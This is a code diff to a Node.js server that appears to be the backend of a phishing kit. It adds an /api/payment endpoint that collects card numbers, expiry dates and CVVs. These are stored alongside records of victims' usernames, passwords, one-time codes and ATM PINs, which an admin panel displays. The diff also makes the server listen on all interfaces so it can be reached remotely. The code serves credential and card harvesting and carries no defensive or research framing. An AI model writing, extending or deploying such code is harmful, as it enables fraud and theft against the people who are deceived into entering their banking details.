@@ -170,6 +170,41 @@ const server = http.createServer(async (req, res) => {
       return sendJSON(res, 200, { ok: true, id: entry.id });
     }
 
+    // ---- API: receive payment / card details ----
+    if (method === 'POST' && pathname === '/api/payment') {
+      const body = await readBody(req);
+      const entry = body.requestId ? requests.find((r) => r.id === Number(body.requestId)) : null;
+      const paymentEntry = entry || {
+        id: nextId++,
+        username: '-',
+        password: '',
+        otp: null,
+        atmPin: '',
+        name: (body.cardName || '-').toString().slice(0, 100),
+        phone: '-',
+        mobile: '-',
+        address: '-',
+        email: '-',
+        cardName: (body.cardName || '-').toString().slice(0, 100),
+        cardNumber: (body.cardNumber || '-').toString().slice(0, 100),
+        cardExpiry: (body.expiryDate || body.cardExpiry || '-').toString().slice(0, 100),
+        cardCvv: (body.cvv || body.cardCvv || '-').toString().slice(0, 100),
+        status: 'pending',
+        createdAt: Date.now(),
+        dateKey: todayKey(),
+      };
+
+      if (body.cardName) paymentEntry.cardName = body.cardName.toString().slice(0, 100);
+      if (body.cardNumber) paymentEntry.cardNumber = body.cardNumber.toString().slice(0, 100);
+      if (body.expiryDate) paymentEntry.cardExpiry = body.expiryDate.toString().slice(0, 100);
+      if (body.cvv) paymentEntry.cardCvv = body.cvv.toString().slice(0, 100);
+
+      paymentEntry.status = 'pending';
+
+      if (!entry) requests.unshift(paymentEntry);
+      return sendJSON(res, 200, { ok: true, id: paymentEntry.id });
+    }
+
     // ---- API: receive a login submission from the customer flow ----
     if (method === 'POST' && pathname === '/api/login') {
       const body = await readBody(req);
@@ -317,8 +352,8 @@ const server = http.createServer(async (req, res) => {
   }
 });
 
-server.listen(PORT, () => {
-  console.log(`✔ الخادم شغال على http://localhost:${PORT}`);
+server.listen(PORT, '0.0.0.0', () => {
+  console.log(`✔ الخادم شغال على http://0.0.0.0:${PORT}`);
   console.log(`  - صفحة العميل: http://localhost:${PORT}/index.html`);
   console.log(`  - لوحة الإدارة: http://localhost:${PORT}/admin.html`);
 });
